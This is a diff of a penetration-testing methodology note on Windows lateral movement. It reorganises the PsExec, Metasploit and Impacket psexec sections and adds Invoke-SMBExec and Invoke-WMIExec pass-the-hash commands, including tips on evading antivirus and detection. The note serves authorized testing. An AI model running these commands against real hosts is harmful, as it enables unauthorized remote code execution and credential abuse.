@@ -77,75 +77,6 @@ of the service above from your network standpoint, AD queries and `nmap` can be
 used in combination (refer to the `[Active Directory] Methodology - Domain
 Recon` note).
 
-###### PsExec
-
-The `PsExec` CLI utility, from the `sysinternals` suite and signed by
-Microsoft, can be used to execute commands, locally or remotely and under the
-current user or the specified user identity.
-
-While the use of a more complete attack framework is recommended on the
-attacking machine (such as `CrackMapExec` or `Metasploit`), `PsExec` can be
-uploaded on a compromised host in order to reach segregated targets as it will
-not raise any anti-virus alerts.
-
-`PsExec` uses a named pipe over the `Server Message Block (SMB)` protocol,
-which runs on TCP port 445. The utility will connect to the `ADMIN$` share of
-the targeted host, upload the `PSEXESVC.exe` binary and use the `Service
-Control Manager` to start the aforementioned binary.
-
-```
-# -s   Run the remote process in the System account.
-# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
-# -d   Don't wait for process to terminate (non-interactive).
-
-psexec [\\computer[,computer2[,...] | @file]] [-u user [-p psswd]] [-n s] [-r servicename] [-h] [-l] [-s|-e] [-x] [-i [session]] [-c [-f|-v]] [-w directory] [-d] [-<priority>][-a n,n,...] cmd [arguments]
-
-# Current user identity
-# Use the -s option to run as SYSTEM if needed
-psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe
-psexec.exe -accepteula \\<HOST | IP> -u <DOMAIN | WORKGROUP>\<USERNAME> -p <PASSWORD> -s -i -d cmd.exe
-psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe /c <COMMAND> <COMMAND_ARGS>
-```
-
-###### Metasploit PsExec
-
-The `Metasploit` module *exploit/windows/smb/psexec* can be used to execute a
-metasploit payload on a target.
-
-This module uses a valid administrator username and password or password hash to
-execute an arbitrary payload, similarly to the `PsExec` utility provided by
-`SysInternals`.
-
-```
-# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
-msf> use exploit/windows/smb/psexec
-```
-
-###### Impacket psexec.py
-
-The python script `psexec.py` from the scripts collection `Impacket` can be used
-as a substitute to the SysInternals or Metasploit psexec tools.
-
-Usage:
-
-```
-# The --target-ip specify the IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is an unresolvable NetBIOS name.
-# The command default to
-psexec.py [-hashes <LM_HASH:NT_HASH>] [-dc-ip <DC_IP>] [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>[:<PASSWORD>]@]<HOSTNAME | IP> [<COMMAND> [<COMMAND> ...]]
-```
-
-Contrary to the two previous tools, the python `Impacket`'s `psexec.py` can be
-easily incorporated in scripts:
-
-```
-import psexec
-
-psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", None, "445/SMB", username = '<USERNAME>', password = '<PASSWORD>')
-raw_result = psobject.run("<HOSTNAME | IP>")
-print raw_result
-psobject.kill();
-```
-
 ###### CrackMapExec
 
 `CrackMapExec` is a "Swiss army knife for pentesting Windows/Active Directory
@@ -216,9 +147,91 @@ Note that:
     error message
   - In case the metinject fails, a local administrator can be added for RDP
     access or a powershell reverse shell injected in memory (refer to the
-    `[General] Shells - PowerShell` note)   
+    `[General] Shells - PowerShell` note)
 
-###### WMI
+###### Over SMB
+
+*PsExec*
+
+The `PsExec` CLI utility, from the `sysinternals` suite and signed by
+Microsoft, can be used to execute commands, locally or remotely and under the
+current user or the specified user identity.
+
+While the use of a more complete attack framework is recommended on the
+attacking machine (such as `CrackMapExec` or `Metasploit`), `PsExec` can be
+uploaded on a compromised host in order to reach segregated targets as it will
+not raise any anti-virus alerts.
+
+`PsExec` uses a named pipe over the `Server Message Block (SMB)` protocol,
+which runs on TCP port 445. The utility will connect to the `ADMIN$` share of
+the targeted host, upload the `PSEXESVC.exe` binary and use the `Service
+Control Manager` to start the aforementioned binary.
+
+```
+# -s   Run the remote process in the System account.
+# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
+# -d   Don't wait for process to terminate (non-interactive).
+
+psexec [\\computer[,computer2[,...] | @file]] [-u user [-p psswd]] [-n s] [-r servicename] [-h] [-l] [-s|-e] [-x] [-i [session]] [-c [-f|-v]] [-w directory] [-d] [-<priority>][-a n,n,...] cmd [arguments]
+
+# Current user identity
+# Use the -s option to run as SYSTEM if needed
+psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe
+psexec.exe -accepteula \\<HOST | IP> -u <DOMAIN | WORKGROUP>\<USERNAME> -p <PASSWORD> -s -i -d cmd.exe
+psexec.exe -accepteula \\<HOST | IP> -s -i -d cmd.exe /c <COMMAND> <COMMAND_ARGS>
+```
+
+*Metasploit PsExec*
+
+The `Metasploit` module *exploit/windows/smb/psexec* can be used to execute a
+metasploit payload on a target.
+
+This module uses a valid administrator username and password or password hash to
+execute an arbitrary payload, similarly to the `PsExec` utility provided by
+`SysInternals`.
+
+```
+# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
+msf> use exploit/windows/smb/psexec
+```
+
+*Impacket psexec.py*
+
+The python script `psexec.py` from the scripts collection `Impacket` can be used
+as a substitute to the SysInternals or Metasploit psexec tools.
+
+Usage:
+
+```
+# The --target-ip specify the IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is an unresolvable NetBIOS name.
+# The command default to
+psexec.py [-hashes <LM_HASH:NT_HASH>] [-dc-ip <DC_IP>] [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>[:<PASSWORD>]@]<HOSTNAME | IP> [<COMMAND> [<COMMAND> ...]]
+```
+
+Contrary to the two previous tools, the python `Impacket`'s `psexec.py` can be
+easily incorporated in scripts:
+
+```
+import psexec
+
+psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", None, "445/SMB", username = '<USERNAME>', password = '<PASSWORD>')
+raw_result = psobject.run("<HOSTNAME | IP>")
+print raw_result
+psobject.kill();
+```
+
+*Invoke-SMBExec*
+
+The `Invoke-SMBExec` PowerShell cmdlet can be used to pass the hash over SMB in PowerShell.
+
+The `Invoke-SMBExec` cmdlet present the advantage to create and delete a
+service with a random name, making it harder for detection.
+
+```
+Invoke-SMBExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose
+```
+
+###### Over WMI
 
 The `Windows Management Instrumentation (WMI)` is a Microsoft suite of tools
 used to retrieve management data and manage Windows assets both locally and
@@ -237,7 +250,16 @@ WMIC /NODE:<HOSTNAME | IP> COMPUTERSYSTEM GET USERNAME
 Invoke-WmiMethod -Class Win32_Process -Name Create "cmd.exe"
 ```
 
-###### PowerShell's WinRM remoting
+The `Invoke-WMIExec` PowerShell cmdlet can be used to pass the hash over `WMI`
+in PowerShell:
+
+```
+Invoke-WMIExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose
+```
+
+###### Over WinRM
+
+*PowerShell's WinRM remoting*
 
 Windows Remote Management (`WinRM`) is the Microsoft implementation of
 WS-Management Protocol, a standard Simple Object Access Protocol
@@ -293,7 +315,7 @@ Once `CredSSP` is activated and correctly configured, the PowerShell cmdlets
 `Invoke-Command` and `Enter-PSSession` can be used with the
 `-Authentication CredSSP` option to make connections using `CredSSP`.
 
-###### WinRM remoting from Linux
+*WinRM remoting from Linux*
 
 The following `ruby` script can be used to start a PowerShell session on a
 distant Windows system through a `WinRM` service:
